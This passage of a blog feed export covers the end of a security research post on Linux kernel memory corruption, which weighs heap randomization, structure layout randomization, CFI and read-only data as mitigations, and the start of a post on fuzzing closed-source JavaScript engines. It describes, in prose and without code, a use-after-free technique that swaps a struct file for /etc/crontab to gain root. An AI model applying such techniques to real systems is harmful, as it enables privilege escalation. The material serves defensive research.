&lt;code&gt;-&amp;gt;random_seq&lt;/code&gt; with randomly-ordered object indices via Fisher-Yates shuffle, with the array length equal to the number of objects that fit into a page. Then, whenever SLUB grabs a new page from the lower-level page allocator, it initializes the page freelist using the indices from &lt;code&gt;-&amp;gt;random_seq&lt;/code&gt;, starting at a random index in the array (and wrapping around when the end is reached). (I'm ignoring the low-order allocation fallback here.)&lt;/p&gt;&lt;p&gt;So in summary, we can bypass SLUB randomization for the slab from which &lt;code&gt;struct file&lt;/code&gt; is allocated because someone used it as a lookup key in a specific type of data structure. This is already fairly undesirable if SLUB randomization is supposed to provide protection against some types of local attacks for all slabs.&lt;/p&gt;&lt;p&gt;The heap-randomization-weakening effect of such data structures is not necessarily limited to cases where elements of the data structure can be listed in-order by userspace: If there was a codepath that iterated through the tree in-order and freed all tree nodes, that could have a similar effect, because the objects would be placed on the allocator's freelist sorted by address, cancelling out the randomization. In addition, you might be able to leak information about iteration order through cache side channels or such.&lt;/p&gt;&lt;p&gt;If we introduce a probabilistic use-after-free mitigation that relies on attackers not being able to learn whether the uppermost bits of an object's address changed after it was reallocated, this data structure could also break that. This case is messier than things like &lt;code&gt;kcmp()&lt;/code&gt; because here the address ordering leak stems from a standard data structure.&lt;/p&gt;&lt;p&gt;You may have noticed that some of the examples I'm using here would be more or less limited to cases where an attacker is reallocating memory &lt;em&gt;with the same type as the old allocation&lt;/em&gt;, while a typical use-after-free attack ends up replacing an object with a differently-typed one to cause type confusion. As an example of a bug that can be exploited for privilege escalation without type confusion at the C structure level, see &lt;a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=808"&gt;entry 808 in our bugtracker&lt;/a&gt;. My exploit for that bug first starts a &lt;code&gt;writev()&lt;/code&gt; operation on a writable file, lets the kernel validate that the file is indeed writable, then replaces the &lt;code&gt;struct file&lt;/code&gt; with a read-only &lt;code&gt;file&lt;/code&gt; pointing to &lt;code&gt;/etc/crontab&lt;/code&gt;, and lets &lt;code&gt;writev()&lt;/code&gt; continue. This allows gaining root privileges through a use-after-free bug without having to mess around with kernel pointers, data structure layouts, ROP, or anything like that. Of course that approach doesn't work with every use-after-free though.&lt;/p&gt;&lt;p&gt;(By the way: For an example of pointer leaks through container data structures in a JavaScript engine, see &lt;a href="https://thejh.net/misc/firefox-cve-2016-9904-and-cve-2017-5378-bugreport"&gt;this bug I reported to Firefox back in 2016, when I wasn't a Google employee&lt;/a&gt;, which leaks the low 32 bits of a pointer by timing operations on pessimal hash tables - basically turning the HashDoS attack into an infoleak. Of course, nowadays, a side-channel-based pointer leak in a JS engine would probably not be worth treating as a security bug anymore, since you can probably get the same result with Spectre...)&lt;/p&gt;&lt;h2&gt;Against freeing SLUB pages: Preventing virtual address reuse beyond the slab&lt;/h2&gt;&lt;p&gt;(Also discussed a little bit on the kernel-hardening list in &lt;a href="https://lore.kernel.org/kernel-hardening/20201006004414.GP20115@casper.infradead.org/"&gt;this thread&lt;/a&gt;.)&lt;/p&gt;&lt;p&gt;A weaker but less CPU-intensive alternative to trying to provide complete use-after-free protection for individual objects would be to ensure that &lt;em&gt;virtual&lt;/em&gt; addresses that have been used for slab memory are never reused outside the slab, but that physical pages can still be reused. This would be the same basic approach as used by &lt;a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md#security"&gt;PartitionAlloc&lt;/a&gt; and others. In kernel terms, that would essentially mean serving SLUB allocations from vmalloc space.&lt;/p&gt;&lt;p&gt;Some challenges I can think of with this approach are:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;SLUB allocations are currently served from the linear mapping, which normally uses hugepages; if vmalloc mappings with 4K PTEs were used instead, TLB pressure might increase, which might lead to some performance degradation.&lt;/li&gt;&lt;li&gt;To be able to use SLUB allocations in contexts that operate directly on physical memory, it is sometimes necessary for SLUB pages to be physically contiguous. That's not really a problem, but it is different from default vmalloc behavior. (Sidenote: DMA buffers don't always have to be physically contiguous - if you have an IOMMU, you can use that to map discontiguous pages to a contiguous DMA address range, just like how normal page tables create virtually-contiguous memory. See &lt;a href="https://git.kernel.org/linus/7d5b5738d151"&gt;this kernel-internal API&lt;/a&gt; for an example that makes use of this, and &lt;a href="https://fuchsia.dev/fuchsia-src/concepts/drivers/driver_development/dma"&gt;Fuchsia's documentation&lt;/a&gt; for a high-level overview of how all this works in general.)&lt;/li&gt;&lt;li&gt;Some parts of the kernel convert back and forth between virtual addresses, &lt;code&gt;struct page&lt;/code&gt; pointers, and (for interaction with hardware) physical addresses. This is a relatively straightforward mapping for addresses in the linear mapping, but would become a bit more complicated for vmalloc addresses. In particular, &lt;code&gt;page_to_virt()&lt;/code&gt; and &lt;code&gt;phys_to_virt()&lt;/code&gt; would have to be adjusted. &lt;ul&gt;&lt;li&gt;This is probably also going to be an issue for things like Memory Tagging, since pointer tags will have to be reconstructed when converting back to a virtual address. Perhaps it would make sense to forbid these helpers outside low-level memory management, and change existing users to instead keep a normal pointer to the allocation around? Or maybe you could let pointers to &lt;code&gt;struct page&lt;/code&gt; carry the tag bits for the corresponding virtual address in unused/ignored address bits?&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The probability that this defense can prevent UAFs from leading to exploitable type confusion depends somewhat on the granularity of slabs; if specific struct types have their own slabs, it provides more protection than if objects are only grouped by size. So to improve the utility of virtually-backed slab memory, it would be necessary to replace the generic kmalloc slabs (which contain various objects, grouped only by size) with ones that are segregated by type and/or allocation site. (The grsecurity/PaX folks have vaguely alluded to doing something roughly along these lines using compiler instrumentation.)&lt;/p&gt;&lt;h2&gt;After reallocation as pagetable: Structure layout randomization&lt;/h2&gt;&lt;p&gt;Memory safety issues are often exploited in a way that involves creating a type confusion; e.g. exploiting a use-after-free by replacing the freed object with a new object of a different type.&lt;/p&gt;&lt;p&gt;A defense that first appeared in grsecurity/PaX is to shuffle the order of struct members at build time to make it harder to exploit type confusions involving structs; the upstream Linux version of this is in &lt;a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/scripts/gcc-plugins/randomize_layout_plugin.c"&gt;scripts/gcc-plugins/randomize_layout_plugin.c&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;How effective this is depends partly on whether the attacker is forced to exploit the issue as a confusion between two structs, or whether the attacker can instead exploit it as a confusion between a struct and an array (e.g. containing characters, pointers or PTEs). Especially if only a single struct member is accessed, a struct-array confusion might still be viable by spraying the entire array with identical elements. Against the type confusion described in this blogpost (between &lt;code&gt;struct pid&lt;/code&gt; and page table entries), structure layout randomization could still be somewhat effective, since the reference count is half the size of a PTE and therefore can randomly be placed to overlap either the lower or the upper half of a PTE. (Except that the upstream Linux version of randstruct only randomizes explicitly-marked structs or structs containing only function pointers, and &lt;code&gt;struct pid&lt;/code&gt; has no such marking.)&lt;/p&gt;&lt;p&gt;Of course, drawing a clear distinction between structs and arrays oversimplifies things a bit; for example, there might be struct types that have a large number of pointers of the same type or attacker-controlled values, not unlike an array.&lt;/p&gt;&lt;p&gt;&lt;em&gt;If&lt;/em&gt; the attacker can not completely sidestep structure layout randomization by spraying the entire struct, the level of protection depends on how kernel builds are distributed:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;If the builds are created centrally by one vendor and distributed to a large number of users, an attacker who wants to be able to compromise users of this vendor would have to rework their exploit to use a different type confusion for each release, which may force the attacker to rewrite significant chunks of the exploit.&lt;/li&gt;&lt;li&gt;If the kernel is individually built per machine (or similar), and the kernel image is kept secret, an attacker who wants to reliably exploit a target system may be forced to somehow leak information about some structure layouts and either prepare exploits for many different possible struct layouts in advance or write parts of the exploit interactively after leaking information from the target system.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;To maximize the benefit of structure layout randomization in an environment where kernels are built centrally by a distribution/vendor, it would be necessary to make randomization a boot-time process by making structure offsets relocatable. (Or install-time, but that would break code signing.) Doing this cleanly (for example, such that 8-bit and 16-bit immediate displacements can still be used for struct member access where possible) would probably require a lot of fiddling with compiler internals, from the C frontend all the way to the emission of relocations. A somewhat hacky version of this approach already exists for C-&amp;gt;BPF compilation as &lt;a href="https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html"&gt;BPF CO-RE&lt;/a&gt;, using the clang builtin &lt;a href="https://clang.llvm.org/docs/LanguageExtensions.html#builtin-preserve-access-index"&gt;&lt;code&gt;__builtin_preserve_access_index&lt;/code&gt;&lt;/a&gt;, but that relies on debuginfo, which probably isn't a very clean approach.&lt;/p&gt;&lt;p&gt;Potential issues with structure layout randomization are:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;If structures are hand-crafted to be particularly cache-efficient, fully randomizing structure layout could worsen cache behavior. The existing randstruct implementation optionally avoids this by trying to randomize only within a cache line.&lt;/li&gt;&lt;li&gt;Unless the randomization is applied in a way that is reflected in DWARF debug info and such (&lt;a href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=84052"&gt;which it isn't in the existing GCC-based implementation&lt;/a&gt;), it can make debugging and introspection harder.&lt;/li&gt;&lt;li&gt;It can break code that makes assumptions about structure layout; but such code is gross and should be cleaned up anyway (and Gustavo Silva &lt;a href="https://github.com/KSPP/linux/issues/109"&gt;has been working&lt;/a&gt; on fixing some of those issues).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;While structure layout randomization by itself is limited in its effectiveness by struct-array confusions, it might be more reliable in combination with limited heap partitioning: If the heap is partitioned such that only struct-struct confusion is possible, and structure layout randomization makes struct-struct confusion difficult to exploit, and no struct in the same heap partition has array-like properties, then it would probably become much harder to directly exploit a UAF as type confusion. On the other hand, if the heap is already partitioned like that, it might make more sense to go all the way with heap partitioning and create one partition per type instead of dealing with all the hassle of structure layout randomization.&lt;/p&gt;&lt;p&gt;(By the way, if structure layouts are randomized, padding should probably also be randomized explicitly instead of always being on the same side to maximally randomize structure members with low alignment; see &lt;a href="https://lore.kernel.org/kernel-hardening/CAG48ez1Mr1FNCDGFscVg0SpuuA_Z4tn=WJhEqJVWW1rOuRiG2w@mail.gmail.com/"&gt;my list post on this topic&lt;/a&gt; for details.)&lt;/p&gt;&lt;h2&gt;Control Flow Integrity&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;I want to explicitly point out that kernel Control Flow Integrity would have had no impact at all on this exploit strategy&lt;/strong&gt;. By using a data-only strategy, we avoid having to leak addresses, avoid having to find ROP gadgets for a specific kernel build, and are completely unaffected by any defenses that attempt to protect kernel code or kernel control flow. Things like getting access to arbitrary files, increasing the privileges of a process, and so on don't require kernel instruction pointer control.&lt;/p&gt;&lt;p&gt;Like in &lt;a href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html"&gt;my last blogpost on Linux kernel exploitation&lt;/a&gt; (which was about a buggy subsystem that an Android vendor added to their downstream kernel), to me, a data-only approach to exploitation feels very natural and seems less messy than trying to hijack control flow anyway.&lt;/p&gt;&lt;p&gt;Maybe things are different for userspace code; but for attacks by userspace against the kernel, I don't currently see a lot of utility in CFI because it typically only affects one of many possible methods for exploiting a bug. (Although of course there could be specific cases where a bug can only be exploited by hijacking control flow, e.g. if a type confusion only permits overwriting a function pointer and none of the permitted callees make assumptions about input types or privileges that could be broken by changing the function pointer.)&lt;/p&gt;&lt;h2&gt;Making important data readonly&lt;/h2&gt;&lt;p&gt;A defense idea that has shown up in a bunch of places (including Samsung phone kernels and XNU kernels for iOS) is to make data that is crucial to kernel security read-only except when it is intentionally being written to - the idea being that even if an attacker has an arbitrary memory write, they should not be able to directly overwrite specific pieces of data that are of exceptionally high importance to system security, such as credential structures, page tables, or &lt;a href="https://googleprojectzero.blogspot.com/2020/07/the-core-of-apple-is-ppl-breaking-xnu.html"&gt;(on iOS, using PPL) userspace code pages&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;The problem I see with this approach is that a large portion of the things a kernel does are, in some way, critical to the correct functioning of the system and system security. MMU state management, task scheduling, memory allocation, &lt;a href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html"&gt;filesystems&lt;/a&gt;, page cache, IPC, ... - if any one of these parts of the kernel is corrupted sufficiently badly, an attacker will probably be able to gain access to all user data on the system, or use that corruption to feed bogus inputs into one of the subsystems whose own data structures are read-only.&lt;/p&gt;&lt;p&gt;In my view, instead of trying to split out the most critical parts of the kernel and run them in a context with higher privileges, it might be more productive to go in the opposite direction and try to approximate something like a proper microkernel: Split out drivers that don't strictly need to be in the kernel and run them in a lower-privileged context that interacts with the core kernel through proper APIs. Of course that's easier said than done! But Linux does already have APIs for safely accessing PCI devices (VFIO) and USB devices from userspace, although userspace drivers aren't exactly its main usecase.&lt;/p&gt;&lt;p&gt;(One might also consider making page tables read-only not because of their importance to system integrity, but because the structure of page table entries makes them nicer to work with in exploits that are constrained in what modifications they can make to memory. I dislike this approach because I think it has no clear conclusion and it is highly invasive regarding how data structures can be laid out.)&lt;/p&gt;&lt;h1&gt;Conclusion&lt;/h1&gt;&lt;p&gt;This was essentially a boring locking bug in some random kernel subsystem that, if it wasn't for memory unsafety, shouldn't really have much of a relevance to system security. I wrote a fairly straightforward, unexciting (and admittedly unreliable) exploit against this bug; and probably the biggest challenge I encountered when trying to exploit it on Debian was to properly understand how the SLUB allocator works.&lt;/p&gt;&lt;p&gt;My intent in describing the exploit stages, and how different mitigations might affect them, &lt;strong&gt;is to highlight that the further a memory corruption exploit progresses, the more options an attacker gains; and so as a general rule, the earlier an exploit is stopped, the more reliable the defense is. Therefore, even if defenses that stop an exploit at an earlier point have higher overhead, they might still be more useful&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;I think that the current situation of software security could be dramatically improved - in a world where a little bug in some random kernel subsystem can lead to a full system compromise, the kernel can't provide reliable security isolation. Security engineers should be able to focus on things like buggy permission checks and core memory management correctness, and not have to spend their time dealing with issues in code that ought to not have any relevance to system security.&lt;/p&gt;&lt;p&gt;In the short term, there are some band-aid mitigations that could be used to improve the situation - like heap partitioning or fine-grained UAF mitigation. These might come with some performance cost, and that might make them look unattractive; but I still think that they're a better place to invest development time than things like CFI, which attempts to protect against much later stages of exploitation.&lt;/p&gt;&lt;p&gt;In the long term, I think something has to change about the programming language - plain C is simply too error-prone. Maybe the answer is Rust; or maybe the answer is to introduce enough annotations to C (along the lines of &lt;a href="https://www.microsoft.com/en-us/research/project/checked-c/"&gt;Microsoft's Checked C project&lt;/a&gt;, although as far as I can see they mostly focus on things like array bounds rather than temporal issues) to allow Rust-equivalent build-time verification of locking rules, object states, refcounting, void pointer casts, and so on. Or maybe another completely different memory-safe language will become popular in the end, neither C nor Rust?&lt;/p&gt;&lt;p&gt;My hope is that perhaps in the mid-term future, we could have a statically verified, high-performance core of kernel code working together with instrumented, runtime-verified, non-performance-critical legacy code, such that developers can make a tradeoff between investing time into backfilling correct annotations and run-time instrumentation slowdown without compromising on security either way.&lt;/p&gt;&lt;h1&gt;TL;DR&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;memory corruption is a big problem because small bugs even outside security-related code can lead to a complete system compromise; and to address that, it is important that we:&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;in the short to medium term:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;design new memory safety mitigations&lt;/strong&gt;: &lt;ul&gt;&lt;li&gt;ideally, that can stop attacks at an early point where attackers don't have a lot of alternate options yet &lt;ul&gt;&lt;li&gt;maybe at the memory allocator level (i.e. SLUB)&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;that can't be broken using address tag leaks (or we try to prevent tag leaks, but that's really hard)&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;continue using attack surface reduction&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;in particular seccomp&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;explicitly prevent untrusted code from gaining important attack primitives&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;like FUSE, and potentially consider fine-grained scheduler control&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;in the long term:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;statically verify correctness of most performance-critical code&lt;/strong&gt;&lt;ul&gt;&lt;li&gt;this will require determining how to retrofit annotations for object state and locking onto legacy C code&lt;/li&gt;&lt;li&gt;consider designing runtime verification just for gaps in static verification&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/8464515825658328843/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/8464515825658328843" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/8464515825658328843" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html" title=" How a simple Linux kernel memory corruption bug can lead to complete system compromise" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-5444284102989534433</id>
    <published>2021-09-14T10:14:00.001-07:00</published>
    <updated>2021-09-20T12:22:23.447-07:00</updated>
    <title type="text">Fuzzing Closed-Source JavaScript Engines with Coverage Feedback</title>
    <content type="html">&lt;style type="text/css"&gt;ul.lst-kix_do14k59gl4sr-0{list-style-type:none}ul.lst-kix_do14k59gl4sr-1{list-style-type:none}ul.lst-kix_do14k59gl4sr-2{list-style-type:none}ul.lst-kix_do14k59gl4sr-3{list-style-type:none}.lst-kix_u927wi79aeqb-0&gt;li:before{content:"-  "}.lst-kix_u927wi79aeqb-1&gt;li:before{content:"-  "}.lst-kix_u927wi79aeqb-2&gt;li:before{content:"-  "}.lst-kix_do14k59gl4sr-2&gt;li:before{content:"-  "}ul.lst-kix_do14k59gl4sr-4{list-style-type:none}.lst-kix_u927wi79aeqb-5&gt;li:before{content:"-  "}ul.lst-kix_do14k59gl4sr-5{list-style-type:none}.lst-kix_do14k59gl4sr-1&gt;li:before{content:"-  "}ul.lst-kix_do14k59gl4sr-6{list-style-type:none}ul.lst-kix_do14k59gl4sr-7{list-style-type:none}.lst-kix_do14k59gl4sr-0&gt;li:before{content:"-  "}ul.lst-kix_do14k59gl4sr-8{list-style-type:none}.lst-kix_u927wi79aeqb-3&gt;li:before{content:"-  "}.lst-kix_u927wi79aeqb-4&gt;li:before{content:"-  "}.lst-kix_u927wi79aeqb-6&gt;li:before{content:"-  "}.lst-kix_do14k59gl4sr-3&gt;li:before{content:"-  "}.lst-kix_do14k59gl4sr-4&gt;li:before{content:"-  "}.lst-kix_u927wi79aeqb-7&gt;li:before{content:"-  "}.lst-kix_u927wi79aeqb-8&gt;li:before{content:"-  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_u927wi79aeqb-0{list-style-type:none}.lst-kix_do14k59gl4sr-6&gt;li:before{content:"-  "}ul.lst-kix_u927wi79aeqb-2{list-style-type:none}.lst-kix_do14k59gl4sr-5&gt;li:before{content:"-  "}.lst-kix_do14k59gl4sr-7&gt;li:before{content:"-  "}ul.lst-kix_u927wi79aeqb-1{list-style-type:none}ul.lst-kix_u927wi79aeqb-4{list-style-type:none}ul.lst-kix_u927wi79aeqb-3{list-style-type:none}ul.lst-kix_u927wi79aeqb-6{list-style-type:none}ul.lst-kix_u927wi79aeqb-5{list-style-type:none}ul.lst-kix_u927wi79aeqb-8{list-style-type:none}ul.lst-kix_u927wi79aeqb-7{list-style-type:none}.lst-kix_do14k59gl4sr-8&gt;li:before{content:"-  "}ol{margin:0;padding:0}table td,table th{padding:0}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c2{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:italic}.c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c7{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c5{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c14{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c6{font-weight:400;font-family:"Courier New"}.c3{margin-left:36pt;padding-left:0pt}.c13{padding:0;margin:0}.c8{color:inherit;text-decoration:inherit}.c11{font-style:italic}.c4{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c14"&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Posted by Ivan Fratric, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;tl;dr I combined &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/fuzzilli"&gt;Fuzzilli&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(an open-source JavaScript engine fuzzer), with &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/TinyInst"&gt;TinyInst&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(an open-source dynamic instrumentation library for fuzzing). I also added grammar-based mutation support to &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/Jackalope"&gt;Jackalope&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;(my black-box binary fuzzer). So far, these two approaches resulted in finding three security issues in jscript9.dll (default JavaScript engine used by Internet Explorer).&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c2" id="h.hggl0cdn9982"&gt;&lt;span class="c9"&gt;Introduction or &amp;ldquo;when you can&amp;rsquo;t beat them, join them&amp;rdquo;&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span&gt;In the past, I&amp;rsquo;ve invested a lot of time in generation-based fuzzing, which was a successful way to find vulnerabilities in various targets, especially those that take some form of language as input. For example, Domato, my grammar-based generational fuzzer, found &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/list?q=ifratric%20webkit&amp;can=1"&gt;over 40 vulnerabilities in WebKit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://bugs.chromium.org/p/project-zero/issues/list?q=ifratric%20jscript&amp;can=1"&gt;numerous bugs in Jscript&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;While generation-based fuzzing is still a good way to fuzz many complex targets, it was demonstrated that, for finding vulnerabilities in modern JavaScript engines, especially engines with JIT compilers, better results can be achieved with mutational, coverage-guided approaches. My colleague Samuel Gro&amp;szlig; gives a compelling case on why that is in his &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://www.youtube.com/watch?v=OHjq9Y66yfc"&gt;OffensiveCon talk&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Samuel is also the author of &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/fuzzilli"&gt;Fuzzilli&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, an open-source JavaScript engine fuzzer based on mutating a custom intermediate language. Fuzzilli has found a large number of bugs in various JavaScript engines.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;While there has been a lot of development on coverage-guided fuzzers over the last few years, most of the public tooling focuses on open-source targets or software running on the Linux operating system. Meanwhile, I focused on developing tooling for fuzzing of closed-source binaries on operating systems where such software is more prevalent (currently Windows and macOS). Some years back, I published &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/winafl"&gt;WinAFL&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the first performant AFL-based fuzzer for Windows. About a year and a half ago, however, I started working on a brand new toolset for black-box coverage-guided fuzzing. &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/TinyInst"&gt;TinyInst&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://github.com/googleprojectzero/Jackalope"&gt;Jackalope&lt;/a&gt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;are the two outcomes of this effort.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;It comes somewhat naturally to combine the tooling I&amp;rsquo;ve been working on with techniques that have been so successful in finding JavaScript bugs, and try to use the resulting tooling to fuzz JavaScript engines for which the source code is not available. Of such engines, I know two: jscript and jscript9 (implemented in jscript.dll and jscript9.dll) on Windows, which are both used by the Internet Explorer web browser. Of these two, jscript9 is probably more interesting in the context of mutational coverage-guided fuzzing since it includes a JIT compiler and more advanced engine features.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;While you might think that Internet Explorer is a &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"&gt;thing of the past&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and it doesn&amp;rsquo;t make sense to spend energy looking for bugs in it, the fact remains that Internet Explorer is still heavily exploited by real-world attackers. &lt;/span&gt;&lt;span&gt;In &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1869060786"&gt;2020&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;there were two Internet Explorer 0days exploited in the wild and three in &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c81" href="https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=2129022708"&gt;2021&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;so far&lt;/span&gt;&lt;span class="c0"&gt;. One of these vulnerabilities was in the JIT compiler of jscript9. I&amp;rsquo;ve personally vowed several times that I&amp;rsquo;m done looking into Internet Explorer, but each time, more 0days in the wild pop up and I change my mind.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Additionally, the techniques described here could be applied to any closed-source or even open-source software, not just Internet Explorer. In particular, grammar-based mutational fuzzing described two sections down can be applied to targets other than JavaScript engines by simply changing the input 